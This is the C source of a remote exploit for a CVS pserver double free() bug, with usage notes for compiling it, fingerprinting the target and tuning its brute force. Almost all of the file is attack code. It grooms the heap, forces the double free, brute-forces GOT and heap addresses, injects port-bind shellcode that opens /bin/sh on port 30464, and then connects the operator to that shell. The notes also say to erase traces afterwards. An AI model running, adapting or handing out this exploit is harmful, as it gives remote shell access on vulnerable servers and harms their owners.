/*****************************************************************************************************/
/* Exploit for CVS double free() in dirswitch() for Linux pserver */
/* Usage instructions:
Any access to the pserver will work, anonymous is enough.
The exploit tries to bind to port 30464 on the target and exec a shell on connection,
It will connect there itself and pass control to you if it succeeds. Accidentally, this means that
if that port is firewalled, the exploit will fail.
Here's what you need to do:
   1. Compile the proggie: gcc -o sploit this_file.c
   2. Make sure the target is running Linux, use nmap -O, it won't work unless it's a Linux
   3. Run the proggie: ./sploit -r repository -u user [ -p password if not empty ] target_host
   4. Look for output, if the exploit doesn't work:
     a. If after readjusting in memory ( you will be told when it happens ) the figures that you see
        (return codes) are 3's, and nothing else, tweak the -j parameter, the default is 7, but
        I had to use 0 on a debian cvs 1.11.1, it worked in the end, you might even try low negative integers
     b. If after readjusting you see not only 3's but 0's, occasionally -2's and others,
        but 0's are of interest, then chances are the -j is correct, then set the -s to 4,
        setting it to 4 means it will bruteforce for longer, but will try every address
   5. If successful, clean up the mess after yourself: rm -rf /tmp/cvs*
   6. Enjoy it even if you don't break in anywhere :)
*/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <errno.h>
#include <signal.h>

/*
Exploit by Igor Dobrovitski, January 2003

And I gave my heart to know wisdom, and to know madness and folly: I perceived that this also is vexation of spirit.
For in much wisdom is much grief: and he that increaseth knowledge increaseth sorrow.
*/

#define NM "Out of memory"

void usage(void);
void die(const char*);
char* ystrdup(const char*);
int connect_to_host(char*, int, int*, int*);
int authenticate(char*, char*, char*, int, int);
char* scramble(char*);
int talk(char*, int);
int get(char*, int, int);
void done(char*, int);

static char *progname;
static int timeout = 1; /* timeout on select() on read() in seconds when reading from target */
static char shellcode[]=

/* I grabbed this shellcode from someone's exploit, thanks heaps to whoever wrote this monster, saved me heaps of time on
   a few occasions :)
*/
/* port bind tcp/30464 ***/
/* fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) */
"\x31\xc0" // xorl %eax,%eax
"\x31\xdb" // xorl %ebx,%ebx
"\x31\xc9" // xorl %ecx,%ecx
"\x31\xd2" // xorl %edx,%edx
"\xb0\x66" // movb $0x66,%al
"\xb3\x01" // movb $0x1,%bl
"\x51" // pushl %ecx
"\xb1\x06" // movb $0x6,%cl
"\x51" // pushl %ecx
"\xb1\x01" // movb $0x1,%cl
"\x51" // pushl %ecx
"\xb1\x02" // movb $0x2,%cl
"\x51" // pushl %ecx
"\x8d\x0c\x24" // leal (%esp),%ecx
"\xcd\x80" // int $0x80

/* port is 30464 !!! */
/* bind(fd, (struct sockaddr)&sin, sizeof(sin) ) */
"\xb3\x02" // movb $0x2,%bl
"\xb1\x02" // movb $0x2,%cl
"\x31\xc9" // xorl %ecx,%ecx
"\x51" // pushl %ecx
"\x51" // pushl %ecx
"\x51" // pushl %ecx
/* port = 0x77, change if needed */
"\x80\xc1\x77" // addb $0x77,%cl
"\x66\x51" // pushl %cx
"\xb1\x02" // movb $0x2,%cl
"\x66\x51" // pushw %cx
"\x8d\x0c\x24" // leal (%esp),%ecx
"\xb2\x10" // movb $0x10,%dl
"\x52" // pushl %edx
"\x51" // pushl %ecx
"\x50" // pushl %eax
"\x8d\x0c\x24" // leal (%esp),%ecx
"\x89\xc2" // movl %eax,%edx
"\x31\xc0" // xorl %eax,%eax
"\xb0\x66" // movb $0x66,%al
"\xcd\x80" // int $0x80

/* listen(fd, 1) */
"\xb3\x01" // movb $0x1,%bl
"\x53" // pushl %ebx
"\x52" // pushl %edx
"\x8d\x0c\x24" // leal (%esp),%ecx
"\x31\xc0" // xorl %eax,%eax
"\xb0\x66" // movb $0x66,%al
"\x80\xc3\x03" // addb $0x3,%bl
"\xcd\x80" // int $0x80

/* cli = accept(fd, 0, 0) */
"\x31\xc0" // xorl %eax,%eax
"\x50" // pushl %eax
"\x50" // pushl %eax
"\x52" // pushl %edx
"\x8d\x0c\x24" // leal (%esp),%ecx
"\xb3\x05" // movl $0x5,%bl
"\xb0\x66" // movl $0x66,%al
"\xcd\x80" // int $0x80

/* dup2(cli, 0) */
"\x89\xc3" // movl %eax,%ebx
"\x31\xc9" // xorl %ecx,%ecx
"\x31\xc0" // xorl %eax,%eax
"\xb0\x3f" // movb $0x3f,%al
"\xcd\x80" // int $0x80

/* dup2(cli, 1) */
"\x41" // inc %ecx
"\x31\xc0" // xorl %eax,%eax
"\xb0\x3f" // movl $0x3f,%al
"\xcd\x80" // int $0x80

/* dup2(cli, 2) */
"\x41" // inc %ecx
"\x31\xc0" // xorl %eax,%eax
"\xb0\x3f" // movb $0x3f,%al
"\xcd\x80" // int $0x80

/* execve("//bin/sh", ["//bin/sh", NULL], NULL); */
"\x31\xdb" // xorl %ebx,%ebx
"\x53" // pushl %ebx
"\x68\x6e\x2f\x73\x68" // pushl $0x68732f6e
"\x68\x2f\x2f\x62\x69" // pushl $0x69622f2f
"\x89\xe3" // movl %esp,%ebx
"\x8d\x54\x24\x08" // leal 0x8(%esp),%edx
"\x31\xc9" // xorl %ecx,%ecx
"\x51" // pushl %ecx
"\x53" // pushl %ebx
"\x8d\x0c\x24" // leal (%esp),%ecx
"\x31\xc0" // xorl %eax,%eax
"\xb0\x0b" // movb $0xb,%al
"\xcd\x80" // int $0x80

/* exit(%ebx) */
"\x31\xc0" // xorl %eax,%eax
"\xb0\x01" // movb $0x1,%al
"\xcd\x80"; // int $0x80



int 
main (int argc, char **argv)
{
  int i, c, fd_in, fd_out;
  int port = 2401;
  int dir_len, arglen;
  char *user = NULL, *passwd = "", *repos = NULL, *host = NULL;
  char outbuf[4096], readbuf[4096];
#define MAX_ARG_SIZE 4085
  int got_i, got_low, got_high, got_step, heap_i, heap_low, heap_high, heap_step;
  int found = 0;
  int version[3];
  int jump = 7;
  int step = 24;

  progname = ystrdup(argv[0]);
  while((c = getopt(argc, argv, "a:j:p:r:s:t:u:")) != -1)
  {
    switch(c)
    {
      case 'a':
        port = atoi(optarg);
        if(!port) die("Illegal port");
        break;
      case 'j':
        jump = atoi(optarg);
        if(!jump) die("Illegal jump");
        break;
      case 'p':
        passwd = ystrdup(optarg);
        break;
      case 'r':
        repos = ystrdup(optarg);
        break;
      case 's':
        step = atoi(optarg);
        if(!step) die("Illegal step");
        break;
      case 't':
        timeout = atoi(optarg);
        if(!timeout) die("Illegal timeout");
        break;
      case 'u':
        user = ystrdup(optarg);
        break;
      default:
        die("Couldn't parse options");
    }
  }
  if(!(user && repos)) usage();
  if(optind != argc - 1) usage();
  host = ystrdup(argv[optind]);

  signal(SIGPIPE, SIG_IGN);

/* Check server version */
  if(connect_to_host(host, port, &fd_in, &fd_out))
    die("Couldn't connect");
  if(authenticate(repos, user, passwd, fd_in, fd_out))
    die("Couldn't authenticate");
  strcpy(outbuf, "version\n");
  if(talk(outbuf, fd_out))
    die("Couldn't talk to server");
  readbuf[0] = 0;
  while(!strchr(readbuf, '\n'))
  {
    if(get(readbuf + strlen(readbuf), sizeof(readbuf) - strlen(readbuf), fd_in) < 0)
      die("Couldn't get from server");
  }
    
  fprintf(stderr, "%s\n", readbuf);
  sscanf(readbuf, "%*[a-zA-Z()\t ]%d.%d.%d", &version[0], &version[1], &version[2]);
  if(version[0] * 100 + version[1] * 10 + version[2] > 214) /* version > 1.11.4 */
  {
    fprintf(stderr, "This version of cvs is immune to the bug we're trying to exploit\n");
    exit(0);
  }

/* Find the right length to malloc() */
  for(dir_len = 65; dir_len <= 255; dir_len += 8)
  {
    int count;
    int status = 0;
    for(count = 0; count < 2; count++)
    {

      arglen = dir_len + 56; /* to make sure we're allocating chunks of the same size */
                             /* 56 is a magic number in this context */

/* Connect and authenticate */
      close(fd_out);
      if(fd_in != fd_out) close(fd_in);
      if(connect_to_host(host, port, &fd_in, &fd_out))
        die("Couldn't connect");
      if(authenticate(repos, user, passwd, fd_in, fd_out))
        die("Couldn't authenticate");

/* Root request */
      snprintf(outbuf, sizeof(outbuf), "Root %s\n", repos);
      if(talk(outbuf, fd_out))
      {
        count = 2;
        continue;
      }


/* We need to keep our precious chunk from being coalesced with others when it or a chunk next to it is free()'d
   So we allocate chunks before and after it, trying to make them come from the main arena, thus being adjacent to ours
*/
      strcpy(outbuf, "Argument ");
      for(i = 0; i < arglen - 48; i++)
        outbuf[9 + i] = '0';
      outbuf[9 + i++] = '\n';
      outbuf[9 + i] = '\0';

      if(talk(outbuf, fd_out))
      {
        count = 2;
        continue;
      }


/* 1st Directory request, valid directory name, intialize the static ptr, make first allocation of memory for the dir_name */
      strcpy(outbuf, "Directory ");
      for(i = 0; i < dir_len; i++)
        outbuf[i + 10] = '0';
      outbuf[i + 10] = '\n';
      outbuf[i + 11] = '\0';
      if(talk(outbuf, fd_out))
      {
        count = 2;
        continue;
      }

      snprintf(outbuf, sizeof(outbuf), "%s\n", repos);
      if(talk(outbuf, fd_out))
      {
        count = 2;
        continue;
      }

/* ditto */
      strcpy(outbuf, "Argument ");
      for(i = 0; i < arglen - 48; i++)
        outbuf[9 + i] = '0';
      outbuf[9 + i++] = '\n';
      outbuf[9 + i] = '\0';

      if(talk(outbuf, fd_out))
      {
        count = 2;
        continue;
      }


/* Make the dirswitch double-free dir_name */
      for(c = 0; c < 2; c++)
      {
        strcpy(outbuf, "Directory ");
        for(i = 0; i < dir_len - 1; i++)
          outbuf[i + 10] = '0';
        outbuf[i + 11] = '/';
        outbuf[i + 12] = '\n';
        outbuf[i + 13] = '\0';
        if(talk(outbuf, fd_out))
        {
          count = 2;
          break;
        }

        snprintf(outbuf, sizeof(outbuf), "%s\n", repos);
        if(talk(outbuf, fd_out))
        {
          count = 2;
          break;
        }

 /* Need to clear the pending_error thingy */
        strcpy(outbuf, "noop\n");
        if(talk(outbuf, fd_out))
        {
          count = 2;
          break;
        }
        if(get(readbuf, sizeof readbuf, fd_in) < 0)
        {
          count = 2;
          break;
        }
      }

/* At this stage all calls to malloc of the right size should be returning our chunk, the heap is corrupted,
   the first call to malloc() will allocate the chunk, and strcpy() our memory addresses into the first 8 bytes,
   the second call to malloc() will again return our chunk, passing it through the unlink() and overwriting memory
*/


      strcpy(outbuf, "Argument ");

      *((void **) (outbuf + 9))  = (void *) ( 0 == count ? 0xbfffffef : 0x01020304);
      *((void **) (outbuf + 13)) = (void *) ( 0 == count ? 0xbfffffef : 0x01020304);

      for(i = 9; i < arglen; i++)
        outbuf[9 + i] = '0';
      outbuf[9 + i++] = '\n';
      outbuf[9 + i] = '\0';

      for(c = 0; c < 2; c++)
        if(talk(outbuf, fd_out))
        {
          count = 2;
          break;
        }

/* At this stage, if the dir_len is right, our double-free()'d chunk has been malloc'd twice, and only twice */
      talk("noop\n", fd_out);
      c = get(readbuf, sizeof readbuf, fd_in);
      if(0 == count && 3 == c)  /* on the first pass the server doesn't segfault as it's able to write near the address 0xbfffffcf */
        status++;
      else if(1 == count && (0 == c || -1 == c)) /* on the 2nd pass the server segfaults as it can't write near the address 0x01020304 */
        status++;
      fprintf(stderr, "%d: %d\n", count, c);
    }
    if(2 == status)
      break;
  }
  if(dir_len > 255) die("Couldn't find exploitable chunk size");
  fprintf(stderr, "Found the right dir_len: %d bytes\n", dir_len);


/* ok, now for exploitation,
   this is a classical "overwrite any integer" case, we have no clue where in the heap our shellcode is, or what
   exactly we're overwriting. We're able to smuggle 4Kb of assembly code into the program, which sounds formiddable, so...
   Bruteforce !!! btw, the next library call after the last malloc() is strcpy(). I wish I knew where its GOT is...
*/

//#define GOT_LOW   0x080ca5e4
#define GOT_LOW   0x080c1010
//#define GOT_HIGH  0x080ca5e4
#define GOT_HIGH  0x080efffc
#define GOT_STEP  10000
#define HEAP_LOW  0x080c1010
#define HEAP_HIGH 0x080efffc
#define HEAP_STEP 40000
//#define HEAP_STEP 4000

got_low = GOT_LOW;
got_high = GOT_HIGH;
got_step = GOT_STEP;
heap_low = HEAP_LOW;
heap_high = HEAP_HIGH;
heap_step = HEAP_STEP;

LOOP:
  for(got_i = got_low; got_i <= got_high; got_i += got_step)
  {
    if(!(got_i & 0xff) || !(got_i >> 8 & 0xff)) continue;   /* can't have nul bytes */
    fprintf(stderr, "Using address %#x\n", got_i);
    for(heap_i = heap_low; heap_i <= heap_high; heap_i += heap_step)
    {
      if(!(heap_i & 0xff) || !(heap_i >> 8 & 0xff)) continue;

/* Connect and authenticate */
      close(fd_in);
      if(fd_out != fd_in)
        close(fd_out);
      if(connect_to_host(host, port, &fd_in, &fd_out))
        die("Couldn't connect");
      if(authenticate(repos, user, passwd, fd_in, fd_out))
        die("Can't authenticate");

/* Root request */
      snprintf(outbuf, sizeof(outbuf), "Root %s\n", repos);
      if(talk(outbuf, fd_out))
        continue;


/* Explained earlier */
      strcpy(outbuf, "Argument ");
      for(i = 0; i < arglen - 48; i++)
        outbuf[9 + i] = '0';
      outbuf[9 + i++] = '\n';
      outbuf[9 + i] = '\0';

      if(talk(outbuf, fd_out))
        continue;


/* 1st Directory request, valid directory name, intialize the static ptr, make first allocation of memory for the dir_name */
      strcpy(outbuf, "Directory ");
      for(i = 0; i < dir_len; i++)
        outbuf[i + 10] = '0';
      outbuf[i + 10] = '\n';
      outbuf[i + 11] = '\0';
      if(talk(outbuf, fd_out))
        continue;

      snprintf(outbuf, sizeof(outbuf), "%s\n", repos);
      if(talk(outbuf, fd_out))
        continue;


/* ditto */
      strcpy(outbuf, "Argument ");
      for(i = 0; i < arglen - 48; i++)
        outbuf[9 + i] = '0';
      outbuf[9 + i++] = '\n';
      outbuf[9 + i] = '\0';

        if(talk(outbuf, fd_out))
          continue;


/* Allocate a chunk, make it as big as possible, put jmp's, nops and shellcode there */
/*
  As it happens, unlink() will always write a 4-byte address 8 bytes from the place in the shellcode it will jump to,
  so we can't just provide a classical cushion of nops, but we can provide a cushion of jmp's, so it will look like this:
 |jmp \x7f|jmp \x7f|...|nop|nop|...shellcode
*/

      strcpy(outbuf, "Argument ");
      for(i = 0; i < MAX_ARG_SIZE - sizeof(shellcode) - 0x80; i+=2)
      {
        outbuf[i + 9] = 0xeb;
        outbuf[i + 10] = 0x7f;
      }
      for(; i < MAX_ARG_SIZE - sizeof(shellcode) - 1; i++)
        outbuf[i + 9] = 0x90;
      strcpy(outbuf + i + 9, shellcode);
      outbuf[i + 9 + sizeof(shellcode) - 1] = '\n';
      outbuf[i + 10 + sizeof(shellcode) - 1] = '\0';

      if(talk(outbuf, fd_out))
        continue;

/* Make the dirswitch double-free dir_name */
      for(c = 0; c < 2; c++)
      {
        strcpy(outbuf, "Directory ");
        for(i = 0; i < dir_len - 1; i++)
          outbuf[i + 10] = '0';
        outbuf[i + 11] = '/';
        outbuf[i + 12] = '\n';
        outbuf[i + 13] = '\0';
        if(talk(outbuf, fd_out))
          break;
        snprintf(outbuf, sizeof(outbuf), "%s\n", repos);
        if(talk(outbuf, fd_out))
          break;

 /* Need to clear the pending_error thingy */
        strcpy(outbuf, "noop\n");
        if(talk(outbuf, fd_out))
          break;
        if(get(readbuf, sizeof readbuf, fd_in) < 0)
          break;
      }


      strcpy(outbuf, "Argument ");
      *((void **) (outbuf + 9))  = (void *) (got_i - 12);
      *((void **) (outbuf + 13)) = (void *) heap_i;

      for(i = 9; i < arglen; i++)
        outbuf[9 + i] = '0';
      outbuf[9 + i++] = '\n';
      outbuf[9 + i] = '\0';

      for(c = 0; c < 2; c++)
        if(talk(outbuf, fd_out))
          break;

/* At this stage, the server may have: a. segfaulted, b. continued, c. jumped to shellcode */
      talk("noop\n", fd_out);
      c = get(readbuf, sizeof readbuf, fd_in);
      fprintf(stderr, "%d\n", c);

/* the next 'if' block determines our position in the heap by the answers it receives from the server
   We start searching low in the heap, and segfault the server, since it can't write to those sections.
   The first writable section we hit is .data
   On the most-used gcc-2.96 (which isn't a gcc version as such, so it's strange everyone is so fond of it),
   we can say that .got is circa 7K up from the start of .data on a recent cvs version
*/
      if(3 == c)
      {
        if(!found)
        {
          fprintf(stderr, "Hit writeable memory, readjusting\n");
          found = 1;
          got_low = got_i + jump * 1024;
          heap_low = got_low + 1024;
          got_high = got_low + 1024;
          got_step = step;
          heap_step = (MAX_ARG_SIZE - 0x80 - sizeof(shellcode)) & ~1;
          goto LOOP;
        }
        else
          break;
      }


    }
    done(host, 30464);
  }
  fprintf(stderr, "The exploit didn't work on this host, sorry...\n");
  return 0;
}

int
connect_to_host (char *host, int port, int *fd_in, int *fd_out)
{
  if(!strcmp(host, "local"))
  {
/* I used this for debugging, not to worry */
    *fd_in  = 0;
    *fd_out = 1;
  }
  else
  {
    int sock, optval = 1;
    struct sockaddr_in target = { 0 };
    struct hostent *he;
    target.sin_family = PF_INET;
    he = gethostbyname(host);
    if(NULL == he)
    {
      char *msg = malloc(strlen(host) + 50);
      if(NULL == msg) die(NM);
      sprintf(msg, "Couldn't resolve host %s", host);
      die(msg);
    }
    target.sin_addr = *((struct in_addr *)he->h_addr);
    target.sin_port = htons(port);

    if((sock = socket(PF_INET, SOCK_STREAM, 6)) == -1)
    {
      perror("socket");
      exit(1);
    }
    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof optval))
      perror("setsockopt");
    
    if(connect(sock, (struct sockaddr *)&target, sizeof(struct sockaddr)))
    {
      return -1;
    }
    *fd_in = *fd_out = sock;
  }
usleep(500000); /* make inetd happy */
  return 0;
}
    
int
authenticate (char *repos, char *user, char *passwd, int fd_in, int fd_out)
{
  char buf[16];
  char *out = malloc(50 + strlen(repos) + strlen(user) + strlen(passwd));
  if(NULL == out) die(NM);

  sprintf(out, "BEGIN AUTH REQUEST\n"
    "%s\n"
    "%s\n"
    "%s\n"
    "END AUTH REQUEST\n", repos, user, scramble(passwd));

  if(talk(out, fd_out)) die("Socket write error");
  free(out);
  get(buf, sizeof buf, fd_in);
  return strcmp(buf, "I LOVE YOU\n");
}



int
talk (char *buf, int fd)
{
  int written = 0;
  int ret = -1;
  fd_set writefd;
  struct timeval tv = { 0 };
  int len = strlen(buf);

  FD_ZERO(&writefd);
  FD_SET( fd, &writefd);

  if(select(fd+1, NULL, &writefd, NULL, &tv))
  {
#ifdef DEBUG
    fprintf(stderr, "talk: %s", buf);
#endif
    if(len)
      written = write(fd, buf, len);
    ret = (written != len); /* 0 on success */
  }
  return ret;
}

int
get (char *buf, int len, int fd)
{
  fd_set readfd;

  int ret = -2;
  struct timeval tv;

  FD_ZERO(&readfd);
  FD_SET( fd, &readfd);

  tv.tv_sec = timeout;
  tv.tv_usec = 0;

  if(select(fd+1, &readfd, NULL, NULL, &tv))
  {
    buf[0] = 0;
    ret = read(fd, buf, len - 1);

#ifdef DEBUG
  fprintf(stderr, "get: %s", buf);
#endif

    buf[ret] = '\0';
  }
  return ret;
}

void
usage (void)
{
  fprintf(stderr, "Usage: %s -r repository -u username [ -p password ] [ -a port ] "
    "[ -t timeout ] [ -j integer around 0 to 10, default 7, obscure feature ]"
    " [ -s step integer between 4 and 24, multiple of 4, step for bruteforcing ] host\n"
    "e.g: %s -r /usr/local/cvs -u anonymous -p hello\n", progname, progname);
  exit(1);
}

void
die (const char *msg)
{
  fprintf(stderr, "%s: %s\n", progname, msg);
  exit(1);
}

char*
ystrdup (const char *s)
{
  char *foo = strdup(s);
  if(NULL == foo) die(NM);
  return foo;
}

char*
scramble ( char *str)
{
    int i;
    char *s;

  unsigned char shifts[] = {
    0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15,
   16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31,
  114,120, 53, 79, 96,109, 72,108, 70, 64, 76, 67,116, 74, 68, 87,
  111, 52, 75,119, 49, 34, 82, 81, 95, 65,112, 86,118,110,122,105,
   41, 57, 83, 43, 46,102, 40, 89, 38,103, 45, 50, 42,123, 91, 35,
  125, 55, 54, 66,124,126, 59, 47, 92, 71,115, 78, 88,107,106, 56,
   36,121,117,104,101,100, 69, 73, 99, 63, 94, 93, 39, 37, 61, 48,
   58,113, 32, 90, 44, 98, 60, 51, 33, 97, 62, 77, 84, 80, 85,223,
  225,216,187,166,229,189,222,188,141,249,148,200,184,136,248,190,
  199,170,181,204,138,232,218,183,255,234,220,247,213,203,226,193,
  174,172,228,252,217,201,131,230,197,211,145,238,161,179,160,212,
  207,221,254,173,202,146,224,151,140,196,205,130,135,133,143,246,
  192,159,244,239,185,168,215,144,139,165,180,157,147,186,214,176,
  227,231,219,169,175,156,206,198,129,164,150,210,154,177,134,127,
  182,128,158,208,162,132,167,209,149,241,153,251,237,236,171,195,
  243,233,253,240,194,250,191,155,142,137,245,235,163,242,178,152 };

    s = malloc (strlen (str) + 2);
    if(NULL == s) die(NM);

    s[0] = 'A';
    strcpy (s + 1, str);

    for (i = 1; s[i]; i++)
        s[i] = shifts[(unsigned char)(s[i])];

    return s;
}

void
done (char* host, int port)
{
  int sock;
  if(connect_to_host(host, port, &sock, &sock))
    return;
  fprintf(stderr, "You've broken in, and here's your prize\n\n");
  signal(SIGPIPE, SIG_DFL);
  if(fork())
  {
    char buf[1024];
    int len;
    write(sock, "id\n", 3);
    while((len = read(0, buf, sizeof(buf))) != EOF)
    {
      write(sock, buf, len);
    }
  }
  else
  {
    char buf[1024];
    int len;
    while((len = read(sock, buf, sizeof(buf) - 1)) != EOF)
    {
      buf[len] = '\0';
      fprintf(stderr, "%s", buf);
    }
  }
}

/**************************************************************************************************/

